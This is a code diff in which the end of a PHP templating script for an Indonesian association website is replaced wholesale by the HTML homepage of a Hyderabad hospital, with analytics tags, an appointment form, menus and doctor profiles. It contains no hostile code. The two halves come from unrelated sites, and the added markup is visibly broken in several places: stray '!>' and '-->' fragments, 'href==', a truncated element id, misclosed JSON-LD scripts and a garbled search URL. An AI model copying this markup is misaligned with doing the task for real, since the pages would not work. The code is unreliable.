-        <img src="<!--vURL-->/images/logo/icon_WAp.png" width="20px" />
-        Helpdesk </div>
-</a>
-';
-$v = str_replace("<!-- button_wa_iai_helpdesk -->", $btn_iai_helpdesk, $v);
-
-
-$btn_tanya_iai = '
-<a href="https://iai.or.id/faq#tanya_iai">
-    <div class="fixed-bottom-message3 align-items-center text-danger">
-        <img src="<!--vURL-->/images/logo/tanya_iai.png" width="20px" /> Tanya-IAI</div>
-</a>
-';
-$v = str_replace("<!-- btn_tanya_iai -->", $btn_tanya_iai, $v);
-
-/*
-$menu_login_dan_ke_admin = '<li>
-<a id="btn-login" href="'.$v_URL.'/login">
-<button type="button" class="btn btn-light btn-xs">Login</button></a>
-</li>
-<li>
-<a id="btn-login" href="'.$url_cms.'">
-<button type="button" class="btn btn-roundeded btn-xs"><span>Admin</span> </button> </a>
-</li>
-';
-
-
-if ( $sedang_login == true )
-{
-        $menu_login_dan_ke_admin = '    <li>
-        <a id="btn-login" href="'.$v_URL.'/dashboard">
-        <button type="button" class="btn btn-light btn-xs">Dashboard</button></a>
-</li>
-<li>
-        <a id="btn-login" href="'.$v_URL.'/logout.php">
-        <button type="button" class="btn btn-roundeded btn-xs"><span>Logout</span> </button> </a>
-</li>
-';
-*/
-
-$menu_login_dan_ke_admin = '<li>
-<a id="btn-login" href="'.$v_URL.'/login">
-<button type="button" class="btn btn-light btn-xs">Login</button></a>
-
-</li>
-
-';
-
-
-if ( $sedang_login == true )
-{
-        $menu_login_dan_ke_admin = '    <li>
-        <a id="btn-login" href="'.$v_URL.'/dashboard">
-        <button type="button" class="btn btn-light btn-xs">Dashboard</button></a>
-</li>
-<li>
-        <a id="btn-login" href="'.$v_URL.'/logout.php">
-        <button type="button" class="btn btn-roundeded btn-xs"><span>Logout</span> </button> </a>
-</li>
-';
-
-
-}
-
-#$nt = gethtml('view/_navigation_top.html');
-if ( file_exists('navigation_top.php')  ) {
-        require_once('navigation_top.php');
-}
-else {  $nt = gethtml('view/_navigation_top.html'); }
-
-$nt = str_replace("<!--menu_login_dan_admin-->", $menu_login_dan_ke_admin, $nt);
-
-$v = str_replace("<!-- navigation_top_templ -->", $nt, $v);
-
-$f = gethtml('view/_footer.html');
-
-#get web settings for footer
-        $arr_paramsf = [];
-        $paramsf = json_encode($arr_paramsf);
-        $web_settings = httpPost($vURL_db_data.'/apidb/web_settings_detail', $paramsf);
-        $aws = json_decode($web_settings, true);
-        //LogstoDebug(__LINE__.'| ###### >>> aws '. var_export($aws, true));
-        $sw_alamat_lengkap = !empty($aws['data']['sw_alamat_lengkap']) ? $aws['data']['sw_alamat_lengkap'] : ''; $f = str_replace("<!--sw_alamat_lengkap-->", $sw_alamat_lengkap, $f);
-        $sw_telepon = !empty($aws['data']['sw_telepon']) ? $aws['data']['sw_telepon'] : ''; $f = str_replace("<!--sw_telepon-->", $sw_telepon, $f);
-        $sw_fax = !empty($aws['data']['sw_fax']) ? $aws['data']['sw_fax'] : ''; $f = str_replace("<!--sw_fax-->", $sw_fax, $f);
-        $sw_email = !empty($aws['data']['sw_email']) ? $aws['data']['sw_email'] : ''; $f = str_replace("<!--sw_email-->", $sw_email, $f);
-        $sw_help_desk = !empty($aws['data']['sw_help_desk']) ? $aws['data']['sw_help_desk'] : ''; $f = str_replace("<!--sw_help_desk-->", $sw_help_desk, $f);
-        $sw_iai_interaktif = !empty($aws['data']['sw_iai_interaktif']) ? $aws['data']['sw_iai_interaktif'] : ''; $f = str_replace("<!--sw_iai_interaktif-->", $sw_iai_interaktif, $f);
-        $sw_link_facebook = !empty($aws['data']['sw_link_facebook']) ? $aws['data']['sw_link_facebook'] : ''; $f = str_replace("<!--sw_link_facebook-->", $sw_link_facebook, $f);
-        $sw_link_twitter = !empty($aws['data']['sw_link_twitter']) ? $aws['data']['sw_link_twitter'] : ''; $f = str_replace("<!--sw_link_twitter-->", $sw_link_twitter, $f);
-        $sw_link_instagram = !empty($aws['data']['sw_link_instagram']) ? $aws['data']['sw_link_instagram'] : ''; $f = str_replace("<!--sw_link_instagram-->", $sw_link_instagram, $f);
-        $sw_link_youtube = !empty($aws['data']['sw_link_youtube']) ? $aws['data']['sw_link_youtube'] : ''; $f = str_replace("<!--sw_link_youtube-->", $sw_link_youtube, $f);
-        $sw_link_whatsapp = !empty($aws['data']['sw_link_whatsapp']) ? $aws['data']['sw_link_whatsapp'] : ''; $f = str_replace("<!--sw_link_whatsapp-->", $sw_link_whatsapp, $f);
-#end of get web settings for footer
-
-
-$v = str_replace(" <!--page_css-->", $page_css, $v);
-
-$current_year = date('Y');
-$f = str_replace("<!--current_year-->", $current_year, $f);
-
-$v = str_replace("<!-- footer_templ -->", $f, $v);
-
-
-
-$v = str_replace("<!--page_js-->", $page_js, $v);
-
-$v = str_replace(" <!--beranda_kalkum_css-->", $beranda_kalkum_css, $v);
-$v = str_replace(" <!--beranda_kalkum_js-->", $beranda_kalkum_js, $v);
-
-$v = str_replace("<!--vURL-->", $v_URL, $v);
-$v = str_replace("<!--vURL_WEB-->", $v_URL, $v);
-
-$v = str_replace("<!--url_cms-->", $url_cms, $v);
-
-$gtag = "
-<!-- Google tag (gtag.js) -->
-<script async src='https://www.googletagmanager.com/gtag/js?id=G-1TG1D06KVZ'></script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+ <!-- Google tag (gtag.js) event -->
+<script>
+  gtag('event', 'conversion_event_phone_call_lead', {
+    // <event_parameters>
+  });
+</script>
+    <!-- Google tag (gtag.js) event - delayed navigation helper -->
+<script>
+  // Helper function to delay opening a URL until a gtag event is sent.
+  // Call it in response to an action that should navigate to a URL.
+  function gtagSendEvent(url) {
+    var callback = function () {
+      if (typeof url === 'string') {
+        window.location = url;
+      }
+    };
+    gtag('event', 'conversion_event_phone_call_lead', {
+      'event_callback': callback,
+      'event_timeout': 2000,
+      // <event_parameters>
+    });
+    return false;
+  }
+</script>
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-057N64H617"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
-
-  gtag('config', 'G-1TG1D06KVZ');
+  gtag('config', 'G-057N64H617');
 </script>
-";
-$v = str_replace("<!--gtag-->", $gtag, $v);
-
-
-if ( !empty($v) )
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-TN4KD0GLTS"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-TN4KD0GLTS');
+</script>
+<meta charset="utf-8">
+<meta name="keywords" content="Best Hospital in  KPHB, Best Hospital in  Kukatpally, best hospital near me, best hospitals in hyderabad, best ent hospital in hyderabad, orthopedic hospital in hy
+derabad, Orthopedics,Gynaecology,Paediatrics & Neonatology,General Medicine,Radiology
+hospital,hospital near me,orthopedic hospital near me,hospitals in kukatpally,kukatpally hospital list,kphb hospitals,best multispeciality hospital" />
+<meta name="description" content="Best Hospital in KPHB, Kukatpally, Hyderabad: Sree Manju Hospitals is the leading super speciality hospital in Kukatpally, Hyderabad and provides best healthcar
+e services." />
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>Best Hospital in  KPHB | Kukatpally -  Sree Manju Hospitals Hyderabad</title>
+<link rel="canonical" href="https://sreemanjuhospitals.com/" />
+<script type="application/ld+json">
 {
-    echo $v;
+  "@context": "https://schema.org",
+  "@type": "CommunityHealth",
+  "name": "Sree Manju Hospitals",
+  "image": "https://sreemanjuhospitals.com/images/logo.png",
+  "@id": "",
+  "url": "https://sreemanjuhospitals.com/",
+  "telephone": "77779 32772",
+  "address": {
+    "@type": "PostalAddress",
+    "streetAddress": "KPHB 5th Phase, opp. Brand Factory, KPHB 5th Phase",
+    "addressLocality": "Kukatpally, Hyderabad",
+    "postalCode": "500072",
+    "addressCountry": "IN"
+  },
+  "geo": {
+    "@type": "GeoCoordinates",
+    "latitude": 17.4834934,
+    "longitude": 78.3921515
+  },
+  "openingHoursSpecification": {
+    "@type": "OpeningHoursSpecification",
+    "dayOfWeek": [
+      "Monday",
+      "Tuesday",
+      "Wednesday",
+      "Thursday",
+      "Friday",
+      "Saturday",
+      "Sunday"
+    ],
+    "opens": "00:00",
+    "closes": "23:59"
+  },
+  "sameAs": [
+    "https://www.facebook.com/SreeManjuHospitals/",
+    "https://twitter.com/SreeManjuHosp",
+    "https://www.instagram.com/sreemanjuhospitals/",
+    "https://www.youtube.com/@sreemanjuhospitals7642",
+    "https://www.linkedin.com/company/sree-manju-hospitals/?viewAsMember=true"
+  ] 
 }
-else { echo "err.."; }
-
-
-
-
-exit();
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org/",
+  "@type": "WebSite",
+  "name": "Sreemanju Hospitals",
+  "url": "https://sreemanjuhospitals.com/",
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https://sreemanjuhospitals.com/about-us.html{search_term_string}https://sreemanjuhospitals.com/gynaecology-obstetrics.html",
+    "query-input": "required name=search_term_string"
+  }
+}
+</script>
+</script>
+<script>(function(w, d) { w.CollectId = "63dbad90dbdefebfff0f4986"; var h = d.head || d.getElementsByTagName("head")[0]; var s = d.createElement("script"); s.setAttribute("type", "text/javascrip
+t"); s.async=true; s.setAttribute("src", "https://collectcdn.com/launcher.js"); h.appendChild(s); })(window, document);</script>
+<!-- Favicon -->
+<link rel="shortcut icon" href="images/favicon.png" />
+<!-- Google Font -->
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Archivo:400,400i,500,500i,600,600i,700,700i&display=swap">
+<!-- CSS Global Compulsory (Do not remove)-->
+<link rel="stylesheet" href="css/font-awesome/all.min.css" />
+<link rel="stylesheet" href="css/flaticon/flaticon.css" />
+<link rel="stylesheet" href="css/bootstrap/bootstrap.min.css" />
+<!-- Page CSS Implementing Plugins (Remove the plugin CSS here if site does not use that feature)-->
+<link rel="stylesheet" href="css/owl-carousel/owl.carousel.min.css" />
+<link rel="stylesheet" href="css/swiper/swiper.min.css" />
+<link rel="stylesheet" href="css/animate/animate.min.css"/>
+<link rel="stylesheet" href="css/magnific-popup/magnific-popup.css" />
+<!-- Template Style -->
+<link rel="stylesheet" href="css/style.css" />
+</head>
+<body>
+<!-- preloader area start -->
+<div class="preloader" id="preloader">
+  <div class="preloader-inner"> </div>
+</div>
+<!-- preloader area end --> 
+<!--Side Form Popup Start Here-->
+<div class="side-form-popup d-none">
+  <div class="popup-wrapper">
+    <div class="form-popup">
+      <div class="close-popup"> × </div>
+      <div class="row justify-content-center">
+        <div class="col-lg-11 col-md-11">
+          <div class="bg-light p-4">
+            <div class="doctor-info">
+              <div class="name">
+                <h4 class="heading-06"> BOOK YOUR DOCTOR’S APPOINTMENT ONLINE </h4>
+              </div>
+              <div class="designation"> <span> If you need any assistance in booking an appointment,<br/>
+                please call our 24/7 Helpline Number - <a class="fw-bold" href="tel:+917777932772"><i class="flaticon-call pe-2"></i> +91 77779 32772 </a> </span> </div>
+            </div>
+            <form class="mt-4 row form-white" action="appointment.php" method="post">
+              <div class="mb-3 col-lg-6 col-6">
+                <input type="text" class="form-control" name="name" placeholder="Name" required>
+              </div>
+              <div class="mb-3 col-lg-6 col-6">
+                <input type="text" class="form-control" name="phone" placeholder="Phone Number" required>
+              </div>
+              <div class="mb-3 col-lg-6">
+                <input type="text" class="form-control" name="email" placeholder="Email Address" required>
+              </div>
+              <div class="mb-3 col-lg-6">
+                <div class="select-wrapper">
+                  <select class="select"  required name="department">
+                    <option value="" selected disabled hidden> Select an Department </option>
+                    <option value="Anaesthesiology"> Anaesthesiology</option>
+                    <option value="Cardiology"> Cardiology</option>
+                    <option value="Dermatology"> Dermatology</option>
+                    <option value="Dialysis"> Dialysis</option>
+                    <option value="Emergency & Critical Care"> Emergency & Critical Care</option>
+                    <option value="ENT"> ENT</option>
+                    <option value="Gastroenterology"> Gastroenterology</option>
+                    <option value="General Physician"> General Physician</option>
+                    <option value="General Surgery"> General Surgery</option>
+                    <option value="Gynaecology & Obstetrics"> Gynaecology & Obstetrics</option>
+                    <option value="Nephrology"> Nephrology</option>
+                    <option value="Neurology"> Neurology</option>
+                    <option value="Oncology"> Oncology</option>
+                    <option value="Orthopaedics"> Orthopaedics</option>
+                    <option value="Pathology"> Pathology</option>
+                    <option value="Paediatrics & Neonatology"> Paediatrics & Neonatology</option>
+                    <option value="Plastic Surgery"> Plastic Surgery</option>
+                    <option value="Psychiatry"> Psychiatry</option>
+                    <option value="Pulmonology"> Pulmonology</option>
+                    <option value="Physiotherapy"> Physiotherapy</option>
+                    <option value="Radiology"> Radiology</option>
+                    <option value="Vascular Surgery"> Vascular Surgery</option>
+                    <option value="Urology"> Urology</option>
+                  </select>
+                </div>
+              </div>
+              <div class="mb-4 col-12">
+                <textarea class="form-control" name="message" placeholder="Enter Your Message" rows="10" required></textarea>
+              </div>
+              <div class="mb-0 col-12">
+                <button type="submit" name="submit" class="btn btn-dark w-100 d-block"> BOOK APPOINTMENT <i class="fas fa-arrow-right ps-3"></i></button>
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<!--// Side Form Popup End Here--> 
+<!--=================================
+    header -->
+<header class="header default">
+  <nav class="navbar navbar-static-top navbar-expand-lg">
+    <div class="container-fluid">
+      <button type="button" class="navbar-toggler" data-bs-toggle="collapse" data-bs-target=".navbar-collapse"><i class="fas fa-align-left"></i></button>
+      <a class="navbar-brand" href="index.php"> <img class="img-fluid" src="images/logo.png" alt=""> </a>
+      <div class="navbar-collapse collapse">
+        <ul class="nav navbar-nav">
+          <li class="nav-item active"> <a class="nav-link" href="index.php">Home</a> </li>
+          <li class="nav-item"> <a href="about-us.html" class="nav-link">About Us</a> </li>
+          <li class="nav-item"> <a href="our-doctors.html" class="nav-link">Our Doctors</a> </li>
+          <li class="dropdown nav-item mega-menu"> <a href="our-departments.html" class="nav-link" data-bs-toggle="dropdown">Departments</a>
+            <ul class="dropdown-menu megamenu">
+              <li>
+                <div class="row">
+                  <div class="col-sm-6 col-lg-3">
+                    <ul class="list-unstyled mt-lg-3">
+                      <li><a href="anaesthesiology.html"> Anaesthesiology </a> </li>
+                      <li><a href="cardiology.html"> Cardiology </a> </li>
+                      <li><a href="dermatology.html"> Dermatology </a> </li>
+                      <li><a href="dialysis.html"> Dialysis </a> </li>
+                      <li><a href="emergency-critical-care.html"> Emergency & Critical Care </a> </li>
+                      <li><a href="ent.html"> ENT </a> </li>
+                    </ul>
+                  </div>
+                  <div class="col-sm-6 col-lg-3">
+                    <ul class="list-unstyled mt-lg-3">
+                      <li><a href="gastroenterology.html"> Gastroenterology </a> </li>
+                      <li><a href="general-physician.html"> General Physician </a> </li>
+                      <li><a href="general-surgery.html"> General Surgery </a> </li>
+                      <li><a href="gynaecology-obstetrics.html"> Gynaecology & Obstetrics </a> </li>
+                      <li><a href="nephrology.html"> Nephrology </a> </li>
+                      <li><a href="neurology.html"> Neurology </a> </li>
+                    </ul>
+                  </div>
+                  <div class="col-sm-6 col-lg-3">
+                    <ul class="list-unstyled mt-lg-3">
+                      <li><a href="oncology.html"> Oncology </a> </li>
+                      <li><a href="orthopaedics.html"> Orthopaedics </a> </li>
+                      <li><a href="pathology.html"> Pathology </a> </li>
+                      <li><a href="paediatrics-neonatology.html"> Paediatrics & Neonatology </a> </li>
+                      <li><a href="plastic-surgery.html"> Plastic Surgery </a> </li>
+                      <li><a href="psychiatry.html"> Psychiatry </a> </li>
+                    </ul>
+                  </div>
+                  <div class="col-sm-6 col-lg-3">
+                    <ul class="list-unstyled mt-lg-3">
+                      <li><a href="pulmonology.html"> Pulmonology </a> </li>
+                      <li><a href="physiotherapy.html"> Physiotherapy </a> </li>
+                      <li><a href="radiology.html"> Radiology </a> </li>
+                      <li><a href="vascular-surgery.html"> Vascular Surgery </a> </li>
+                      <li><a href="urology.html"> Urology </a> </li>
+                    </ul>
+                  </div>
+                </div>
+              </li>
+            </ul>
+          </li>
+          <li class="nav-item"> <a href="health-packages.html" class="nav-link"> Health Packages </a> </li>
+          <li class="dropdown nav-item"> <a href="" class="nav-link" data-bs-toggle="dropdown"> Patient Care </a>
+            <ul class="dropdown-menu">
+              <li><a class="dropdown-item" href="facilities.html">Facilities<i class="fas fa-arrow-right"></i></a></li>
+              <li><a class="dropdown-item" href="admission-discharge-guide.html">Admission & Discharge Guide<i class="fas fa-arrow-right"></i></a></li>
+              <li><a class="dropdown-item" href="patient-visitor-guidelines.html">Patient & Visitor Guidelines <i class="fas fa-arrow-right"></i></a></li>
+              <li><a class="dropdown-item" href="patients-rights-responsibilties.html"> Patients Rights & Responsibilties<i class="fas fa-arrow-right"></i></a></li>
+              <li><a class="dropdown-item" href="photo-gallery.html"> Photo Gallery <i class="fas fa-arrow-right"></i></a></li>
+               
+              <li><a class="dropdown-item" href="insurance.html">Insurance <i class="fas fa-arrow-right"></i></a></li>
+            </ul>
+          </li>
+          <li class="nav-item"> <a href="blog.php" class="nav-link">Blog</a> </li>
+              <li class="nav-item"> <a href="contact-us.php" class="nav-link">Contact Us</a> </li>
+        </ul>
+      </div>
+      <div class="d-sm-flex ms-auto me-lg-0 pe-5 pe-lg-0">
+        <ul class="nav ms-lg-2 align-self-center">
+          <li class="contact-number nav-item pe-4 "> <a class="fw-bold" href="tel:+917777932772"><i class="flaticon-call pe-2"></i> +91 77779 32772 </a> </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+</header>
+<!--=================================
+    header --> 
+<!--=================================
+    banner -->
+<section class="banner">
+  <div class="swiper-container">
+    <div class="swiper-wrapper h-600 h-sm-400">
+      <div class="swiper-slide align-items-center d-flex responsive-overlap-md slider-img-1">
+        <div class="swipeinner container-fluid">
+          <div class="row justify-content-center">
+            <div class="col-lg-10 col-md-12 text-left position-relative">
+              <h1 data-swiper-animation="fadeInUp" data-duration="1s" data-delay="0.25s">  </h1>
+              <h6 data-swiper-animation="fadeInUp" data-duration="1s" data-delay="0.5s"></h6>
+              <a class data-duration="1s" data-delay="0.75s" href="#" id="open-form-popup"><i class="fas fa-right ps-3"></i></a> </div>
+          </div>
+        </div>
+      </div>
+      <div class="swiper-slide align-items-center d-flex responsive-overlap-md slider-img-2">
+        <div class="swipeinner container-fluid">
+          <div class="row justify-content-center">
+            <div class="col-lg-10 col-md-12 text-left position-relative">
+              <h1 data-swiper-animation="fadeInUp" data-duration="1s" data-delay="0.25s">  </h1>
+              <h6 data-swiper-animation="fadeInUp" data-duration="1s" data-delay="0.5s"></h6>
+       <a class data-swiper-animation="1s" data-delay="0.75s" href="#" id="open-form-popup"><i class="fas fa-right ps-3"></i></a> </div>!>
+          </div>
+        </div>
+      </div>
+      <div class="swiper-slide align-items-center d-flex responsive-overlap-md slider-img-3">
+        <div class="swipeinner container-fluid">
+          <div class="row justify-content-center">
+            <div class="col-lg-10 col-md-12 text-left position-relative">
+              <h1 data-swiper-animation="fadeInUp" data-duration="1s" data-delay="0.25s"> </h1>
+              <h6 data-swiper-animation="fadeInUp" data-duration="1s" data-delay="0.5s"></h6>
+              <a class = data-swiper-animation="1s" data-delay="0.75s" href=="#" id="ope"</i></a> </div>
+          </div>
+        </div>
+      </div>
+      <div class="swiper-slide align-items-center d-flex responsive-overlap-md slider-img-4">
+        <div class="swipeinner container-fluid">
+          <div class="row justify-content-center">
+            <div class="col-lg-10 col-md-12 text-left position-relative">
+              <h1 data-swiper-animation="fadeInUp" data-duration="1s" data-delay="0.25s"> </h1>
+              <h6 data-swiper-animation="fadeInUp" data-duration="1s" data-delay="0.5s"></h6>
+              <a class="" data="fadeInUp" data-duration="1s" data-delay="0.75s" href="#" id="open-form-popup"><i class="fas fa-arrow- ps-3"></i></a> </div>
+          </div>
+        </div>
+      </div>
+      <div class="swiper-slide align-items-center d-flex responsive-overlap-md slider-img-5">
+        <div class="swipeinner container-fluid">
+          <div class="row justify-content-center">
+            <div class="col-lg-10 col-md-12 text-left position-relative">
+              <h1 data-swiper-animation="fadeInUp" data-duration="1s" data-delay="0.25s">  </h1>
+              <h6 data-swiper-animation="fadeInUp" data-duration="1s" data-delay="0.5s"></h6>
+              <a class="" data="fadeInUp" data-duration="1s" data-delay="0.75s" href="#" id="open-form-popup"><i class="fas fa-right ps-3"></i></a> </div>
+          </div>
+        </div>
+      </div>-->
+    </div>
+    <div class="swiper-button-prev">
+      <div class="arrow-up"> <span class="arrow-line"></span><span class="caret-up"></span></div>
+    </div>
+    <div class="swiper-button-next">
+      <div class="arrow-down"> <span class="arrow-line"></span><span class="caret-down"></span></div>
+    </div>
+  </div>
+</section>
+<!--=================================
+    banner -->
+<section class="about-section">
+  <div class="container">
+    <div class="row align-items-center">
+      <div class="images-column col-lg-6 col-md-12 col-sm-12">
+        <div class="inner-column">
+          <figure class="image-1 show-sm"><img src="images/image-1-mobile.png" alt=""></figure>
+          <figure class="image-1 hide-sm"><img src="images/image-1.png" alt=""></figure>
+          <figure class="image-2 hide-sm"><img src="images/image-2.png" alt=""></figure>
+          <figure class="image-3 hide-sm"> <span class="hex"></span> <img src="images/image-3.png" alt=""> </figure>
+        </div>
+      </div>
+      <div class="col-lg-6 mb-4 mb-lg-0">
+        <div class="section-title"> <span class="text-uppercase text-mutedq mb-20"> WELCOME TO SREE MANJU HOSPITAL </span>
+          <h2> Modern Healthcare at Sree Manju Hospitals </h2>
+          <span class="divider"><svg viewBox="0 0 300.08 300.08">
+          <path d="m293.26 184.14h-82.877l-12.692-76.138c-.546-3.287-3.396-5.701-6.718-5.701-.034 0-.061 0-.089 0-3.369.027-6.199 2.523-6.677 5.845l-12.507 87.602-14.874-148.69c-.355-3.43-3.205-
+6.056-6.643-6.138-.048 0-.096 0-.143 0-3.39 0-6.274 2.489-6.752 5.852l-19.621 137.368h-9.405l-12.221-42.782c-.866-3.028-3.812-5.149-6.8-4.944-3.13.109-5.777 2.332-6.431 5.395l-8.941 42.332h-73.0
+49c-3.771 0-6.82 3.049-6.82 6.82 0 3.778 3.049 6.82 6.82 6.82h78.566c3.219 0 6.002-2.251 6.67-5.408l4.406-20.856 6.09 21.313c.839 2.939 3.526 4.951 6.568 4.951h20.46c3.396 0 6.274-2.489 6.752-5.
+845l12.508-87.596 14.874 148.683c.355 3.437 3.205 6.056 6.643 6.138h.143c3.39 0 6.274-2.489 6.752-5.845l14.227-99.599 6.397 38.362c.546 3.287 3.396 5.702 6.725 5.702h88.66c3.771 0 6.82-3.049 6.8
+2-6.82-.001-3.772-3.05-6.821-6.821-6.821z"></path>
+          </svg></span> 
+        </div>
+        <p> Established in 2021 by Dr. Praveen Puralasetty, renowned Radiologist in Hyderabad, Sree Manju Hospital reaches out to the masses with world-class healthcare that is affordable and ac
+cessible. Its commitment to providing advanced medical solutions is strengthened by an excellent infrastructure.</p>
+        <p class="mb-4">The mid-size, multi-specialty hospital brings cutting-edge technology and a team of physicians and specialists within reach of all in need. </p>
+        <a class="btn btn-dark text-white mt-3" href="about-us.html">More About Us</a> 
+      </div>
+    </div>
+  </div>
+</section>
+<section class="services-section">
+  <div class="container">
+    <div class="section-title text-center"> <span class="sub-title"> SREE MANJU SPECIALITIES</span>
+      <h2>We Care Our Patients.</h2>
+      <span class="divider"><svg viewBox="0 0 300.08 300.08">
+      <path d="m293.26 184.14h-82.877l-12.692-76.138c-.546-3.287-3.396-5.701-6.718-5.701-.034 0-.061 0-.089 0-3.369.027-6.199 2.523-6.677 5.845l-12.507 87.602-14.874-148.69c-.355-3.43-3.205-6.05
+6-6.643-6.138-.048 0-.096 0-.143 0-3.39 0-6.274 2.489-6.752 5.852l-19.621 137.368h-9.405l-12.221-42.782c-.866-3.028-3.812-5.149-6.8-4.944-3.13.109-5.777 2.332-6.431 5.395l-8.941 42.332h-73.049c-
+3.771 0-6.82 3.049-6.82 6.82 0 3.778 3.049 6.82 6.82 6.82h78.566c3.219 0 6.002-2.251 6.67-5.408l4.406-20.856 6.09 21.313c.839 2.939 3.526 4.951 6.568 4.951h20.46c3.396 0 6.274-2.489 6.752-5.845l
+12.508-87.596 14.874 148.683c.355 3.437 3.205 6.056 6.643 6.138h.143c3.39 0 6.274-2.489 6.752-5.845l14.227-99.599 6.397 38.362c.546 3.287 3.396 5.702 6.725 5.702h88.66c3.771 0 6.82-3.049 6.82-6.
+82-.001-3.772-3.05-6.821-6.821-6.821z"></path>
+      </svg></span> </div>
+    <div class="row"> 
+      <!-- Service Block -->
+      <div class="service-block col-lg-4 col-md-6 col-sm-12">
+        <div class="inner-box"> <i class="icon flaticon-heartbeat"></i>
+          <h5><a href="#">Health Check</a></h5>
+          <div class="text">Sree Manju Hospitals is offering you the flexibility to choose the best health check-up packages that match your needs. </div>
+        </div>
+      </div>
+      
+      <!-- Service Block -->
+      <div class="service-block col-lg-4 col-md-6 col-sm-12">
+        <div class="inner-box"> <i class="icon flaticon-surgery-room"></i>
+          <h5><a href="#">Operation Theater</a></h5>
+          <div class="text">Sree Manju Hospital facilities boast of highly equipped, advanced and sterile operation theatres.</div>
+        </div>
+      </div>
+      
+      <!-- Service Block -->
+      <div class="service-block col-lg-4 col-md-6 col-sm-12">
+        <div class="inner-box"> <i class="icon flaticon-pharmacy"></i>
+          <h5><a href="#">Pharmacy Support</a></h5>
+          <div class="text">Our 24/7 open pharmacy is operated by trained pharmacists to ensure that all the medicines are well organized.</div>
+        </div>
+      </div>
+      
+      <!-- Service Block -->
+      <div class="service-block col-lg-4 col-md-6 col-sm-12">
+        <div class="inner-box"> <i class="icon flaticon-ambulance"></i>
+          <h5><a href="#">24/7 Ambulance </a></h5>
+          <div class="text"> Our technical team is available for 24/7, We always prepared any emergency situation with 8 ambulances.</div>
+        </div>
+      </div>
+      
+      <!-- Service Block -->
+      <div class="service-block col-lg-4 col-md-6 col-sm-12">
+        <div class="inner-box"> <i class="icon flaticon-lab"></i>
+          <h5><a href="#">Lab Tests</a></h5>
+          <div class="text">The Department of Clinical Imaging and Interventional Radiology at Sree Manju Hospitals is a world-class facility offering </div>
+        </div>
+      </div>
+      
+      <!-- Service Block -->
+      <div class="service-block col-lg-4 col-md-6 col-sm-12">
+        <div class="inner-box"> <i class="icon flaticon-monitor"></i>
+          <h5><a href="#">Intensive Care</a></h5>
+          <div class="text">Intensive Care Units employ a “line of sight” approach that ensures 360 degree access to critically ill patients. </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+<section class="team-section">
+  <div class="container">
+    <div class="row justify-content-center">
+      <div class="col-lg-9">
+        <div class="section-title text-center mb-5"> <span class="sub-title"> TEAM</span>
+          <h2> Our Dedicated Doctors Team </h2>
+          <span class="divider"><svg viewBox="0 0 300.08 300.08">
+          <path d="m293.26 184.14h-82.877l-12.692-76.138c-.546-3.287-3.396-5.701-6.718-5.701-.034 0-.061 0-.089 0-3.369.027-6.199 2.523-6.677 5.845l-12.507 87.602-14.874-148.69c-.355-3.43-3.205-
+6.056-6.643-6.138-.048 0-.096 0-.143 0-3.39 0-6.274 2.489-6.752 5.852l-19.621 137.368h-9.405l-12.221-42.782c-.866-3.028-3.812-5.149-6.8-4.944-3.13.109-5.777 2.332-6.431 5.395l-8.941 42.332h-73.0
+49c-3.771 0-6.82 3.049-6.82 6.82 0 3.778 3.049 6.82 6.82 6.82h78.566c3.219 0 6.002-2.251 6.67-5.408l4.406-20.856 6.09 21.313c.839 2.939 3.526 4.951 6.568 4.951h20.46c3.396 0 6.274-2.489 6.752-5.
+845l12.508-87.596 14.874 148.683c.355 3.437 3.205 6.056 6.643 6.138h.143c3.39 0 6.274-2.489 6.752-5.845l14.227-99.599 6.397 38.362c.546 3.287 3.396 5.702 6.725 5.702h88.66c3.771 0 6.82-3.049 6.8
+2-6.82-.001-3.772-3.05-6.821-6.821-6.821z"></path>
+          </svg></span> </div>
+      </div>
+    </div>
+    <div class="row mt-4">
+      <div class="col-12">
+        <div class="owl-carousel text-start" data-nav-dots="true" data-items="4" data-md-items="4" data-sm-items="3" data-xs-items="1" data-xx-items="1">
+          <div class="items">
+            <div class="case-study case-study-style-02">
+              <div class="case-study-img case-study-lg" style="background-image: url('images/team/dr-praveen-manjusree-hospital.jpg');"> </div>
+              <div class="case-study-info">
+                <p class="case-study-title fw-bold"> Dr. PRAVEEN PURALASETTY <br/>
+                  <small> MANAGING DIRECTOR </small> </p>
+                <p class="case-study-services"> MBBS MD - <small> Reg No :- 69457 </small> </p>
+                <p class="mt-1 mb-0"> Consultant Radiologist </p>
+                <p class="mt-1 mb-0"> Exp: 10 Years </p>
+              </div>
+            </div>
+          </div>
+          <div class="items">
+            <div class="case-study case-study-style-02">
+              <div class="case-study-img case-study-lg" style="background-image: url('images/team/dr-ajith-manjusree-hospital.jpg');"> </div>
+              <div class="case-study-info">
+                <p class="case-study-title fw-bold"> Dr. AJIT KUMAR AZAD </p>
+                <p class="case-study-services"> MBBS DNB (Internal Medicine) - <small> Reg No:- 05736 </small> </p>
+                <p class="mt-1 mb-0"> Senior Consultant Physician & Diabetologist </p>
+                <p class="mt-1 mb-0"> Exp: 12 Years </p>
+              </div>
+            </div>
+          </div>
+          <div class="items">
+            <div class="case-study case-study-style-02">
+              <div class="case-study-img case-study-lg" style="background-image: url('images/team/dr-rajashekarreddy-manjusree-hospital.jpg');"> </div>
+              <div class="case-study-info">
+                <p class="case-study-title fw-bold"> Dr. RAJASHEKAR REDDY KANDI </p>
+                <p class="case-study-services"> MBBS, MS Ortho, MCH Ortho, FIJR, FIASM - <small> Reg No:- 63599 </small> </p>
+                <p class="mt-1 mb-0">Consultant Trauma, Arthroscopy, Arthroplasty, Pelvi-Acetabular Surgeon </p>
+                <p class="mt-1 mb-0"> Exp: 13 Years </p>
